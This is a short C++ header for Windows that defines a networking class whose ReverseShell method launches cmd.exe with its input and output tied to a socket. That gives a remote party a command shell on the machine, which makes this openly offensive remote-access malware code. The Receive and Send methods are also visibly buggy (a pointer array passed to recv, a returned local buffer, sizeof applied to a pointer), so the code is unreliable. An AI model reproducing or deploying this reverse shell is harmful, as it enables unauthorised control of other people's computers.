#pragma once
#include <windows.h>
#include <WinSock2.h>

class Net
{

private:

	SOCKET Socket;

	WSADATA WsaData;

	struct sockaddr_in HostInfo;

	char IpAddress[16];

	STARTUPINFO ProcessInit;

	PROCESS_INFORMATION ProcessInformation;

public:
	Net(char * addr="localhost", int port=9999);

	char * Receive(int BufferSize=1024) {

		char * Buffer[BufferSize];

		recv(Socket, &Buffer, BufferSize, MSG_OOB);

		return Buffer;

	}

	bool Send(char * Data) {

		if (send(Socket, Data, sizeof(Data), MSG_OOB) == SOCKET_ERROR) {

			return false;

		}

		return true;

	}

	void ReverseShell() {

		memset(&ProcessInit, 0, sizeof(ProcessInit));

		ProcessInit.cb = sizeof(ProcessInit);

		ProcessInit.dwFlags = STARTF_USESTDHANDLES;

		ProcessInit.hStdInput = ProcessInit.hStdOutput = ProcessInit.hStdError = (HANDLE)Socket;

		CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &ProcessInit, &ProcessInformation);

	}

	~Net();
};
//final

